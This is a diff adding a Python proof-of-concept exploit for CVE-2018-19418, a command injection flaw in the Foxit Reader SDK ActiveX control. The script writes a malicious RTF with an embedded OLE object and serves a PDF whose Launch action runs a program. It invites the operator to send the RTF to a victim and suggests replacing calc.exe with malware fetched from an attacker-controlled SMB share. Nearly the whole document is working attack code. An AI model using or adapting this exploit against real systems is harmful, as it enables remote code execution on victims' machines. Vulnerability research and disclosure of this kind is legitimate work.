@@ -1,0 +1,182 @@
+#!/usr/bin/python
+"""
+Foxit Reader SDK ActiveX Launch Action New Window Command Injection Remote Code Execution Vulnerability
+Download: https://developers.foxitsoftware.com/pdf-sdk/windows/activex/
+SRC: SRC-2019-0009
+CVE: CVE-2018-19418
+
+Summary:
+========
+
+This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Foxit Reader SDK ActiveX Pro. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. 
+
+The specific flaw exists within the Launch action using new windows. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code under the context of the current process.
+
+Affected:
+=========
+
+Version: 5.4.0.1031 (latest)
+File: FoxitPDFSDKActiveX540_Std.msi - sha1: eba1a06230cc1a39ccb1fb7f04448a0d78859b60
+File: FoxitPDFSDKActiveX540_Pro.msi - sha1: 243a9099c9788dfcf38817f20208e5289b530f56
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <attackers_ip>
+(+) eg: ./poc.py 172.16.175.1
+
+saturn:~ mr_me$ ./poc.py 172.16.175.1
+(+) poc.rtf created!
+(+) starting http server...
+(+) send someone the poc.rtf file...
+(!) triggered a request for the poc.pdf!
+^C(+) ending!
+(+) achieved remote code execution!
+"""
+import sys
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+
+class pdf(BaseHTTPRequestHandler):
+    count = 0
+
+    def log_message(self, format, *args):
+        return
+
+    def _set_headers(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/pdf')
+        self.end_headers()
+
+    def do_GET(self):
+
+        # This is where the magic happens, we can reach the pdf parser in our target without scripting the ActiveX object.
+        if "poc.pdf" in self.path:
+            self._set_headers()
+            self.wfile.write(build_pdf())
+            if pdf.count == 1:
+                print "(!) triggered a request for the poc.pdf!"
+            pdf.count += 1
+
+def build_pdf():
+    """
+    This is the method that delivers the malicious pdf
+    If you want, change 'c:/Windows/System32/calc.exe' to a smb path for some malware, eg: '//attacker/share/malware.exe'
+    """
+    code = """%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /Launch /NewWindow true /F (c:/Windows/System32/calc.exe) >> trailer <</Root 1 0 R>>"""
+    return code
+
+def build_rtf():
+    """
+    This just builds the rtf file that will load our pdf from remote.
+    It was tested on Microsoft Office 2013/2016 x86/x64
+    """
+    global t
+
+    # An rtf trick taken from the sample used to target CVE-2018-8174
+    d  = r"{\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}{\*\generatorMsftedit5.41.21.2510;}\viewkind4\uc"
+    d += r"1\pard\sa200\sl276\slmult1\lang9\f0\fs22{\object\objocx\f37\objsetsize\objw9511\objh7134{\*\objclassFoxit.FoxitPDFSDKStdCtrl.5}{"
+    d += r"\*\objdata 01050000020000001b000000466f7869742e466f78697450444653444b5374644374726c2e35000000000000000000000e0000d0cf11e0a1b11ae"
+    d += r"1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000fefffff"
+    d += r"f0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff0500000"
+    d += r"0feffffff04000000fefffffffefffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f00740"
+    d += r"0200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500fffffff"
+    d += r"fffffffff020000002b096c0f4c6e7649b38627a9fd9e96a1000000000000000000000000f05af014295bd401030000000004000000000000030050005200490"
+    d += r"04e005400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e000201fffffff"
+    d += r"fffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000004a000000000000004f0043005800440"
+    d += r"04100540041000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100002010100000"
+    d += r"004000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000002000000c40100000000000003004f0062006a0"
+    d += r"049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000200fffffff"
+    d += r"fffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000a000000060000000000000001000000fefffff"
+    d += r"f03000000040000000500000006000000070000000800000009000000fefffffffefffffffeffffff0d0000000e0000000f000000fefffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    d += r"fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff080087412631000"
+    d += r"00100090000032100000000000500000000000400000003010800050000000b0200000000050000000c02dc017a02030000001e00040000002701ffff0300000"
+    d += r"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000001000000"
+    d += r"02b096c0f4c6e7649b38627a9fd9e96a10b000000000000000c00000004000000010000000b000000080000005f00560065007200730069006f006e000d00000"
+    d += r"0060000003300320037003600380030000b000000080000005f0045007800740065006e00740058000d00000005000000310036003700370035000b000000080"
+    d += r"000005f0045007800740065006e00740059000d00000005000000310032003500380032000b0000000b0000005f00530074006f0063006b00500072006f00700"
+    d += r"073000d0000000100000030000b00000008000000460069006c00650050006100740068000d00000068000000410042004300440041004100410041004100410"
+    d += r"04100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410"
+    d += r"04100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410"
+    d += r"04100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041004100410041000000000"
+    d += r"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001203000400000"
+    d += r"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046006f007800690"
+    d += r"07400500044004600530044004b00310000000000000000000000000000000000000000000000000000000000000000000000000000000000000005008741000"
+    d += r"02631000000000000fffeff00fffeff68URI0000000000000000000000000000000000000000000000000003004f00430058004e0041004d0045000000000000"
+    d += r"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010300000005000000ffffffff0000000000"
+    d += r"000000000000000000000000000000000000000000000000000000000000000b0000001c0000000000000043006f006e00740065006e00740073000000000000"
+    d += r"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000200ffffffffffffffffffffffff0000000000"
+    d += r"000000000000000000000000000000000000000000000000000000000000000c000000e800000000000000000000000000000000000000000000000000000000"
+    d += r"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000"
+    d += r"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    d += r"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000"
+    d += r"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000d0000004d45544146494c4550"
+    d += r"4943540087410000daceffff4a00000008008741263100000100090000032100000000000500000000000400000003010800050000000b020000000005000000"
+    d += r"0c02dc017a02030000001e00040000002701ffff030000000000}{\result {\rtlch\fcs1 \af31507 \ltrch\fcs0 \insrsid16534234 {\pict{\*\picpr"
+    d += r"op\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{"
+    d += r"\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}"
+    d += r"{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillH"
+    d += r"itTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}{\sp{\sn fScriptAnch"
+    d += r"or}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscal"
+    d += r"ey100\piccropl0\piccropr0\piccropt0\piccropb0\picw16775\pich12582\picwgoal9510\pichgoal7133\wmetafile8\bliptag298849336\blipupi9"
+    d += r"6{\*\blipuid 11d01438e054a3568b5699404bbe70c3}0100090000032100000000000500000000000400000003010800050000000b0200000000050000000c"
+    d += r"02dc017a02030000001e00040000002701ffff030000000000}}}}\par}"
+    
+    # I use 104 bytes as the maximum payload length here, it should be enough for any uri
+    padding = 104-len(t)
+    t = t + ("b" * padding)
+    uri = t.encode("utf-16").encode("hex")
+    rtf = d.replace("URI", uri[4:-2])
+    with open("poc.rtf", "w") as poc:
+        poc.write(rtf)
+
+def check_arg():
+    global t
+    if len(sys.argv) < 2:
+        return False
+    t  = "http://%s:9090/poc.pdf?a=" % sys.argv[1]
+    return True
+
+def main():
+    if not check_arg():
+        print "(+) usage: %s <attackers_ip>" % sys.argv[0]
+        print "(+) eg: %s 172.16.175.1" % sys.argv[0]
+        sys.exit()
+
+    build_rtf()
+    print "(+) poc.rtf created!"
+    server = HTTPServer(('0.0.0.0', 9090), pdf)
+    print "(+) starting http server..."
+    print "(+) send someone the poc.rtf file..."
+
+    try:
+        server.serve_forever()
+    except:
+        print "(+) ending!"
+    print "(+) achieved remote code execution!"
+
+if __name__ == '__main__':
+    main()
